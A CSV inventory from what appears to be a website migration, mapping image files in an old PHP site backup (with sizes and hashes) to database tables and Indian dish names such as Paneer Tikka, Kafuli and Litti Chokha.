53.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/53.jpg,66200,ac86211cc164f49c6a22a91b6c44dd477887995d22bd44d992d5cb91c7e7e561,876d28c234d2de3b1f78c73bd07c176a,DB Mapped (Verified),menu_item_tbl,53,Tanatan Kofta,menu_small_img
54.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/54.jpg,16438,7410f7bba5dce36bf51ed86340bf0dc65a56e72cb72551fdc4015df265976e11,8b77527c6bea67e10928bee463030263,DB Mapped (Verified),menu_item_tbl,54,Paneer Pakora,menu_img
54.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/54.jpg,16438,7410f7bba5dce36bf51ed86340bf0dc65a56e72cb72551fdc4015df265976e11,8b77527c6bea67e10928bee463030263,DB Mapped (Verified),menu_item_tbl,54,Paneer Pakora,menu_small_img
55.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/55.jpg,20975,067ef257f594e1627c08ce60b6fd5a750a4047394d266722315069235b8fc9ca,fc787928aa74b0de223412c3cbae2108,DB Mapped (Verified),menu_item_tbl,55,Samosa(Matar/Allo),menu_img
55.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/55.jpg,20975,067ef257f594e1627c08ce60b6fd5a750a4047394d266722315069235b8fc9ca,fc787928aa74b0de223412c3cbae2108,DB Mapped (Verified),menu_item_tbl,55,Samosa(Matar/Allo),menu_small_img
56.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/56.jpg,6555,0295b5d331cc2ee1a510684aac8c1ffddcf3bfc496176d8426e91eaa07837fb1,67e341a19d6a74db644f4e3240163886,DB Mapped (Verified),menu_item_tbl,56,French Fry,menu_img
56.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/56.jpg,6555,0295b5d331cc2ee1a510684aac8c1ffddcf3bfc496176d8426e91eaa07837fb1,67e341a19d6a74db644f4e3240163886,DB Mapped (Verified),menu_item_tbl,56,French Fry,menu_small_img
57.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/57.jpg,22373,31bfec092b1043a0227cadd527fcb27c72bc6786ef55aba3b3886dbe018d5b08,8140b9921c8b582edd6af136e569636e,DB Mapped (Verified),menu_item_tbl,57,Roasted Potato,menu_img
57.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/57.jpg,22373,31bfec092b1043a0227cadd527fcb27c72bc6786ef55aba3b3886dbe018d5b08,8140b9921c8b582edd6af136e569636e,DB Mapped (Verified),menu_item_tbl,57,Roasted Potato,menu_small_img
58.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/58.jpg,16182,f4d22d8a4870d8178c1fe88753e5e2b9fe712fa0165c9a68d61118eef63193bc,22cb3a444a28528c8b15e6c710baf7aa,DB Mapped (Verified),menu_item_tbl,58,Roasted Pineapple,menu_img
58.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/58.jpg,16182,f4d22d8a4870d8178c1fe88753e5e2b9fe712fa0165c9a68d61118eef63193bc,22cb3a444a28528c8b15e6c710baf7aa,DB Mapped (Verified),menu_item_tbl,58,Roasted Pineapple,menu_small_img
59.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/59.jpg,12019,a348a79acefe5e61289e2920b5e15f861a963417c3e8e30af75d9147caa77791,2d18f67f876e2da285962e43d7274ddf,DB Mapped (Verified),menu_item_tbl,59,Roasted Mushroom,menu_img
59.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/59.jpg,12019,a348a79acefe5e61289e2920b5e15f861a963417c3e8e30af75d9147caa77791,2d18f67f876e2da285962e43d7274ddf,DB Mapped (Verified),menu_item_tbl,59,Roasted Mushroom,menu_small_img
6.webp,old-website-php/Full-website-backup/frontEnd/menuimg/6.webp,56850,b9872c83463af683fe8d833fd4c5edf7e29c84acca0b563afcf71139c7751adc,98ad7327cc7f280a534b6179ecc080e3,DB Mapped (Verified),menu_item_tbl,6,Lemon Rice,menu_img
6.webp,old-website-php/Full-website-backup/frontEnd/menuimg/6.webp,56850,b9872c83463af683fe8d833fd4c5edf7e29c84acca0b563afcf71139c7751adc,98ad7327cc7f280a534b6179ecc080e3,DB Mapped (Verified),menu_item_tbl,6,Lemon Rice,menu_small_img
60.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/60.jpg,20790,87c26c44bf084c856bb7685b2e313771b8f696c7413aa882d76373e95e3d7c4a,909e058b74edb446c31fd91291219b21,DB Mapped (Verified),menu_item_tbl,60,Roasted Cauliflower,menu_img
60.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/60.jpg,20790,87c26c44bf084c856bb7685b2e313771b8f696c7413aa882d76373e95e3d7c4a,909e058b74edb446c31fd91291219b21,DB Mapped (Verified),menu_item_tbl,60,Roasted Cauliflower,menu_small_img
61.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/61.jpeg,13818,5a0cae14485ae2bb650d00a197c106dda70eeda7baf3181d4c657c5503ad62b7,44f79ab7175d327d1fe76e90ce41f069,DB Mapped (Verified),menu_item_tbl,61,Roasted Apple,menu_img
61.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/61.jpeg,13818,5a0cae14485ae2bb650d00a197c106dda70eeda7baf3181d4c657c5503ad62b7,44f79ab7175d327d1fe76e90ce41f069,DB Mapped (Verified),menu_item_tbl,61,Roasted Apple,menu_small_img
62.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/62.jpg,22877,e0562072e1be6f70fb6f637d24cc790a6b802fe3d5745ccd577c4a0b0f0f7bdd,d103e5522ed28bbfc89258f98c14eb80,DB Mapped (Verified),menu_item_tbl,62,Paneer Tikka,menu_img
62.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/62.jpg,22877,e0562072e1be6f70fb6f637d24cc790a6b802fe3d5745ccd577c4a0b0f0f7bdd,d103e5522ed28bbfc89258f98c14eb80,DB Mapped (Verified),menu_item_tbl,62,Paneer Tikka,menu_small_img
63.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/63.jpeg,18215,8584b25caa3f231d001b168fbaed1975af79f21d3239b35737a581bb46b03be0,d76cbb3208da8bf9e4ce847da788e007,DB Mapped (Verified),menu_item_tbl,63,Veg Cutlet,menu_img
63.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/63.jpeg,18215,8584b25caa3f231d001b168fbaed1975af79f21d3239b35737a581bb46b03be0,d76cbb3208da8bf9e4ce847da788e007,DB Mapped (Verified),menu_item_tbl,63,Veg Cutlet,menu_small_img
64.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/64.jpg,14317,c7eb78c49193928cf4bced22fbbc2a30f4451530968d9301347e311c658e069d,0f32383a06ce42c60156386e02b6779f,DB Mapped (Verified),menu_item_tbl,64,Alu Cutlet,menu_img
64.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/64.jpg,14317,c7eb78c49193928cf4bced22fbbc2a30f4451530968d9301347e311c658e069d,0f32383a06ce42c60156386e02b6779f,DB Mapped (Verified),menu_item_tbl,64,Alu Cutlet,menu_small_img
65.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/65.jpeg,10160,cda8d7d839d88e396d8d0d1e014d549bfcca9a933c8c9562c814fa66aff8012b,4b04ce1e4ccf02a5664b6849d79d4644,DB Mapped (Verified),menu_item_tbl,65,Cheese Cutlet,menu_img
65.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/65.jpeg,10160,cda8d7d839d88e396d8d0d1e014d549bfcca9a933c8c9562c814fa66aff8012b,4b04ce1e4ccf02a5664b6849d79d4644,DB Mapped (Verified),menu_item_tbl,65,Cheese Cutlet,menu_small_img
66.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/66.jpg,13125,6674905bef1a288b5b15c42cf9b59f424863750a326efe7977696ea01a14ad3b,a4476789a3d96fad16cd524af556a78a,DB Mapped (Verified),menu_item_tbl,66,Corn Cutlet,menu_img
66.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/66.jpg,13125,6674905bef1a288b5b15c42cf9b59f424863750a326efe7977696ea01a14ad3b,a4476789a3d96fad16cd524af556a78a,DB Mapped (Verified),menu_item_tbl,66,Corn Cutlet,menu_small_img
67.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/67.jpg,12419,407e6d308ba0d6f74460be8a8b0a6f3bd01d4c961cb9d1795c40d4bef758409e,7814a755f3f528effa886fbdd1c1ee93,DB Mapped (Verified),menu_item_tbl,67,Samosa,menu_img
67.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/67.jpg,12419,407e6d308ba0d6f74460be8a8b0a6f3bd01d4c961cb9d1795c40d4bef758409e,7814a755f3f528effa886fbdd1c1ee93,DB Mapped (Verified),menu_item_tbl,67,Samosa,menu_small_img
68.webp,old-website-php/Full-website-backup/frontEnd/menuimg/68.webp,89588,bfc1beae7a7e5d84364930550c75b987ea1f642fccd262712e8d1e2c885f1691,dd1afbfa016891114bdf5f63c2e550ee,DB Mapped (Verified),menu_item_tbl,68,Golgappe/Puchke,menu_img
69.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/69.jpeg,12967,407d08920abe4f7fb093147db215498b60db6e2e2b082d5e6539e6f93c54a488,f921acaf013f1e60ec4423de772340af,DB Mapped (Verified),menu_item_tbl,69,Raj Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
70.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/70.jpg,286049,0365d997faff2c3ac61d1df778cf25580b49b07f574d901ce9b76dfa27033c47,5eaf1ba0886cded734fb81c4c3080d31,DB Mapped (Verified),menu_item_tbl,70,Laccha Tokri,menu_img
71.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/71.jpg,125015,8902a8a8543c861cead9ac16bce35376562eea39e3ed71d263687f196aeaa154,099e5c1edc0312c2972fae02f34624ce,DB Mapped (Verified),menu_item_tbl,71,Aloo Papri Chat,menu_img
72.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/72.jpeg,10137,782c5357352b704732324e8dcb11ad2b4d329bf96c1fb04b26064ed2a9eb7aa0,1d3dbcaa82f67f7be08132cbcd5985cf,DB Mapped (Verified),menu_item_tbl,72,Dhai Bhalla,menu_img
73.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/73.jpg,98659,aefc6d69352b53eadd54e9ef1528846df563507a844d72705b3a605e57ce7258,881b6ae046924047e8b6243d1604bc2e,DB Mapped (Verified),menu_item_tbl,73,Haldvani Tikki Roll,menu_img
74.webp,old-website-php/Full-website-backup/frontEnd/menuimg/74.webp,49550,55797591d421b239342f9010c94039e185511579cc74026a624f146071f49afe,67ed7f3d214d1f274e7295ca48840675,DB Mapped (Verified),menu_item_tbl,74,Dal Paneer Ki Tikia,menu_img
75.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/75.jpeg,7137,8d0db56eb5138d9e9ca6bad1fd7af1c13917bf0fca5311749c899d1e47efa21e,3fcce59498414199b30aa73fa8170d3d,DB Mapped (Verified),menu_item_tbl,75,Paneer Corn Tikia,menu_img
76.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/76.jpg,65564,b41b6b3c9b4386a79d8cc2ff623cc4ca4c0a7c4308794b6c420e5fd7ea779e37,19bd8b42c25fd898627c0943876e5e4f,DB Mapped (Verified),menu_item_tbl,76,Aloo Matar Chat,menu_img
77.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/77.jpg,109078,76a5d44f97b7c10d731945b36eabea1cd40beb189b08f79d372c3660ebe25563,9ed974712bea20e1de5825890f428ddd,DB Mapped (Verified),menu_item_tbl,77,Shakargandhi Chat,menu_img
78.webp,old-website-php/Full-website-backup/frontEnd/menuimg/78.webp,54882,2747dd7b5992d590313395bc77cf33b99e72e108cec2c880867675ea441e92ca,c1c5d16d2dafe9c32360e83574463cb7,DB Mapped (Verified),menu_item_tbl,78,American Corn (Live),menu_img
79.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/79.jpeg,10832,e82653cd2f70a89dfc02fa0deb41028f217d6688a78c2990f445f5706b08ebdb,3ec873fc864e67ed8617c1e4c3ad91e1,DB Mapped (Verified),menu_item_tbl,79,Veg Spring Roll,menu_img
8.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/8.jpeg,10115,8e34904ccc5637057c24d01e299a4030160d4f5c2d005e4c7d0cad1ce33c4826,d20d11d640e6e9325cde9996143e7236,DB Mapped (Verified),menu_item_tbl,8,Coconut Rice,menu_img
8.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/8.jpeg,10115,8e34904ccc5637057c24d01e299a4030160d4f5c2d005e4c7d0cad1ce33c4826,d20d11d640e6e9325cde9996143e7236,DB Mapped (Verified),website_gallery,8,Images 8,gimage
80.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/80.jpg,116553,f68df1bd46cb27caefb2dee138c8ac7c09fb652f841cab9af92cb0882656a7a0,f2d7aff316d21c5baf3f93e94212756a,DB Mapped (Verified),menu_item_tbl,80,Veg Wonton,menu_img
81.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/81.jpeg,75240,f05fe8ae2eb5faccfe23e9ddd7ff19786a42f4172ae98c5d3d1c4318475749c2,c9ae04c84081e5f093d10eb1ed2a2150,DB Mapped (Verified),menu_item_tbl,81,Veg Dimsum,menu_img
82.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/82.jpg,86362,24c350ac6ae2dab53464b57c44d316170e9d402620030eb5ce0215926e87ae10,157c298cfb3e6ae5ff8623d74afcad3c,DB Mapped (Verified),menu_item_tbl,82,Chili Gobhi,menu_img
83.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/83.jpg,68062,1f0c99cec9cc970597115db06eaa36b6314538668204e915abb4bebc39f329d4,098c39575ecd19390f7bc17e17f497af,DB Mapped (Verified),menu_item_tbl,83,Chinese Samosa,menu_img
84.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/84.jpg,331091,03f8490c01a47f4ab3648e4429ef493e0ae66645a63e0226043484d0ae2fc688,30d6cf1858487df31e959b09a9d31d98,DB Mapped (Verified),menu_item_tbl,84,Fried Rice/Ginger Fried Rice,menu_img
85.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/85.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,85,Chilli Paneer,menu_img
86.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/86.jpg,34288,bd127b159982f47d05d462ab25400baf588fce5f09c916bac8b7d28626c19f08,37875fd6bbb6481afed331cd5a29e793,DB Mapped (Verified),menu_item_tbl,86,Veg. Fried Dimsum,menu_img
87.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/87.jpeg,11198,981f780ca1c9e1612a947a7cb51bc2773e3e0f7465141ddac8e1b1930cefdec5,74218117f0c14134827cdafb1e018ca7,DB Mapped (Verified),menu_item_tbl,87,Veg. Manchurian Dry,menu_img
88.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/88.jpg,13483,4b8a95a3e8517ee648f4eb5366ae3c38c358f8c05a869e3e87ea064a96a3c7f9,50049ebd4c81212736554d7c909f584f,DB Mapped (Verified),menu_item_tbl,88,Kafuli,menu_img
88.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/88.jpg,13483,4b8a95a3e8517ee648f4eb5366ae3c38c358f8c05a869e3e87ea064a96a3c7f9,50049ebd4c81212736554d7c909f584f,DB Mapped (Verified),menu_item_tbl,88,Kafuli,menu_small_img
89.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/89.jpeg,8210,4fa3f68cc11a3e721a22e11cff837130da84fc359deeefd3e36ce8c320769dd8,547503e7bc1eb4fa9f554f2fe1f22ced,DB Mapped (Verified),menu_item_tbl,89,Thechwani,menu_img
89.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/89.jpeg,8210,4fa3f68cc11a3e721a22e11cff837130da84fc359deeefd3e36ce8c320769dd8,547503e7bc1eb4fa9f554f2fe1f22ced,DB Mapped (Verified),menu_item_tbl,89,Thechwani,menu_small_img
9.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/9.jpg,161161,e7fe20d91f1ccdec6b446b73d985d1cc146ec1cc614268578974716b44d01cf1,27b1030614d30313656d85c09f739264,DB Mapped (Verified),menu_item_tbl,9,Tamarind Rice,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/9.jpg,161161,e7fe20d91f1ccdec6b446b73d985d1cc146ec1cc614268578974716b44d01cf1,27b1030614d30313656d85c09f739264,DB Mapped (Verified),product_item_tbl,9,Atta Dry Fruit Laddoo,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/9.jpg,161161,e7fe20d91f1ccdec6b446b73d985d1cc146ec1cc614268578974716b44d01cf1,27b1030614d30313656d85c09f739264,DB Mapped (Verified),worke_work_experience,9,knows these Cuisines2,workproimg
9.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/9.jpg,161161,e7fe20d91f1ccdec6b446b73d985d1cc146ec1cc614268578974716b44d01cf1,27b1030614d30313656d85c09f739264,DB Mapped (Verified),recipe_appliances_kits,9,Green Capsicum,kits_img
90.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/90.jpg,21086,77dc5ae78bcd6d51f9a1de0a31dbb8476d31746382d4c32b35c4bf24b68a39d3,372b24628e75592a572631929db259af,DB Mapped (Verified),menu_item_tbl,90,Bhang Ki Chutney,menu_img
90.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/90.jpg,21086,77dc5ae78bcd6d51f9a1de0a31dbb8476d31746382d4c32b35c4bf24b68a39d3,372b24628e75592a572631929db259af,DB Mapped (Verified),menu_item_tbl,90,Bhang Ki Chutney,menu_small_img
91.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/91.jpg,7824,00ebb4250aff98677bebcedd1fd3625da182e121f0824cbf8763d02abd4a5e2f,1defd289536e7c6c21b93d297054ce83,DB Mapped (Verified),menu_item_tbl,91,Garhwal ka Fannah,menu_img
91.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/91.jpg,7824,00ebb4250aff98677bebcedd1fd3625da182e121f0824cbf8763d02abd4a5e2f,1defd289536e7c6c21b93d297054ce83,DB Mapped (Verified),menu_item_tbl,91,Garhwal ka Fannah,menu_small_img
92.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/92.jpg,12980,fbe05c9ffdb2a63c71d32b05f0dd703e0ca1f65bcd1467dcc1661c12dad476bd,f23fa7b9efe5a4702fd48196465e6dc8,DB Mapped (Verified),menu_item_tbl,92,Phaanu,menu_img
92.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/92.jpg,12980,fbe05c9ffdb2a63c71d32b05f0dd703e0ca1f65bcd1467dcc1661c12dad476bd,f23fa7b9efe5a4702fd48196465e6dc8,DB Mapped (Verified),menu_item_tbl,92,Phaanu,menu_small_img
93.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/93.jpg,95943,54b44b9e4ad4641d57fd9fe0c404f1b941a0385d9e8dcf06409af92c504ceade,aff18760baa9ecd4eefa54ea937e1d64,DB Mapped (Verified),menu_item_tbl,93,Baadi,menu_img
93.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/93.jpg,95943,54b44b9e4ad4641d57fd9fe0c404f1b941a0385d9e8dcf06409af92c504ceade,aff18760baa9ecd4eefa54ea937e1d64,DB Mapped (Verified),menu_item_tbl,93,Baadi,menu_small_img
94.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/94.jpg,37263,79d4876ca6a41ae4f773707aead2db89b3c03bb8af49e61e5723c98cb4d00f74,fa29bd04d7e4d0ab99f429d578a83c12,DB Mapped (Verified),menu_item_tbl,94,Kandalee Ka Saag,menu_img
94.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/94.jpg,37263,79d4876ca6a41ae4f773707aead2db89b3c03bb8af49e61e5723c98cb4d00f74,fa29bd04d7e4d0ab99f429d578a83c12,DB Mapped (Verified),menu_item_tbl,94,Kandalee Ka Saag,menu_small_img
95.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/95.jpg,15165,9ce4e570fb71320a71b92fe46a52b39902a01e4bc75d988587ea7edcd64a7914,db6d2e9b748268b8038e4fdc93389f2b,DB Mapped (Verified),menu_item_tbl,95,Chainsoo,menu_img
95.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/95.jpg,15165,9ce4e570fb71320a71b92fe46a52b39902a01e4bc75d988587ea7edcd64a7914,db6d2e9b748268b8038e4fdc93389f2b,DB Mapped (Verified),menu_item_tbl,95,Chainsoo,menu_small_img
96.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/96.jpeg,8925,1eebcc4ee5fd1017119ae0f28ed5a56cb66ef97e639aa87728fbe449849dcd53,1faa0996ae7dc943ee5d0ece81aef631,DB Mapped (Verified),menu_item_tbl,96,Kumaoni Raita,menu_img
96.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/96.jpeg,8925,1eebcc4ee5fd1017119ae0f28ed5a56cb66ef97e639aa87728fbe449849dcd53,1faa0996ae7dc943ee5d0ece81aef631,DB Mapped (Verified),menu_item_tbl,96,Kumaoni Raita,menu_small_img
97.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/97.jpg,13807,4f748acd76a5b404b9a78d4f1c25d6c6ca3160d63600c327d9ac78de54806cb1,383a56c81ce3ce22295cd7021e2e3096,DB Mapped (Verified),menu_item_tbl,97,Dubuk,menu_img
97.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/97.jpg,13807,4f748acd76a5b404b9a78d4f1c25d6c6ca3160d63600c327d9ac78de54806cb1,383a56c81ce3ce22295cd7021e2e3096,DB Mapped (Verified),menu_item_tbl,97,Dubuk,menu_small_img
98.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/98.jpg,33488,a5a59e31051ec5717778f58515afc7d3ff54bd38c63e950b29193218ad33c592,3e69b63b96ca9ecc2ff017c839136dc1,DB Mapped (Verified),menu_item_tbl,98,Kadhi Badi,menu_img
98.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/98.jpg,33488,a5a59e31051ec5717778f58515afc7d3ff54bd38c63e950b29193218ad33c592,3e69b63b96ca9ecc2ff017c839136dc1,DB Mapped (Verified),menu_item_tbl,98,Kadhi Badi,menu_small_img
99.webp,old-website-php/Full-website-backup/frontEnd/menuimg/99.webp,33798,b13b32ca153290089b7e3bfdbeb16741b5ecbca43494907f61c551a60acbac14,7e5a8ddb991857faae19009135a07fb4,DB Mapped (Verified),menu_item_tbl,99,Jhangora Ki Kheer - Uttarakhand,menu_img
.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/.jpg,107129,80afcef699e782ec00ed4d476cb380e2cf077318da8ca915e51e6ec9d563449f,6754251b83fa9333714374e6e8d3ca36,Static / Orphaned Disk Asset,,,,
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
116.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_img
116.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_small_img
117.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_img
117.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_small_img
118.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_img
118.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_small_img
119.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_img
119.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_small_img
120.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_img
120.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_small_img
121.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_img
121.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_small_img
122.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_img
